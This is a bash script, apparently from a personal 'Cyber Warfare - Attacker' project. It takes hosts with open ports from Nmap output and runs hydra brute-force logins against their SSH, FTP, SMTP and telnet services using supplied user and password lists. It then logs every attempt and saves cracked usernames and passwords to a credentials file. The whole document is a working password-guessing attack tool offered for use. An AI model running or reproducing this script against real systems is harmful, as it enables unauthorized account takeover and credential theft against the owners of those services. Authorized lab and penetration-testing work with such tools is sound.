#!/bin/bash

#Author:  TOMER DAHAN
#Github:  https://github.com/tomer333/
#Social:  https:https://www.linkedin.com/in/tomer-dahan-375540235/
#Version: 1.0

#Project Cyber Warfare - Attacker

### brute.sh - a program for scan.sh

#Brute forces all targets found with open ports and saves data in to logs.
#Uses files .user.lst and .pass.lst which can be configured.
#
#Brute Force
#	-five login services to brute force (chosen: ssh ftp smb smtp irc).


## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

services_list="ssh ftp smtp telnet" #smb irc http (and many other can be added)

# Loop over all targets found with open ports
while IFS= read -r line
do
	if [[ "$line" != "" ]] && [[ $line != *"Nmap results:"* ]]
	then
		ip=$(echo "$line" | awk '{print $2}' | cut -d "m" -f2)
		for service in $(echo $services_list)
		do
			if [[ $line == *"$service"* ]]
			then
				port=$(echo $line | awk '{print $10}' | cut -d "/" -f1 | cut -d "m" -f2)

				sudo hydra "$ip" -L .user.lst -P .pass.lst -s $port -t 8 $service -e nsr -V -I -q 2>/dev/null > BF_results.lst
					
				# Save all attempts in attempts.log
				echo "${GREEN}ATTEMPTS ON: ${BLUE}IP: ${ORANGE}$ip ${BLUE}PORT: ${ORANGE}$port ${BLUE}SERVICE: ${ORANGE}$service" >> ./logs/attempts.log
				cat BF_results.lst | grep "ATTEMPT" >> ./logs/attempts.log
				
				# Find success attempt
				cracked=$(cat BF_results.lst | grep "host:")
				if [ "$cracked" != "" ]
				then
					username=$(echo "$cracked" | awk '{print $5}')
					password=$(echo "$cracked" | awk '{print $7}')
					data="${MAGENTA}IP: ${RED}$ip ${MAGENTA}PORT: ${RED}$port ${MAGENTA}SERVICE: ${RED}$service ${MAGENTA}USERNAME: ${RED}$username ${MAGENTA}PASSWORD: ${RED}$password"
					# Skip duplicates
					check=$(cat ./logs/credentials.log | grep "$ip" | grep "$port" | grep "$service")
					if [ "$check" == "" ]
					then
					# Save all cracked credentials in ./logs/credentials.log
						echo "$data" >> ./logs/credentials.log
					fi
				fi
			fi
		done
	fi
done < To_Brute.lst
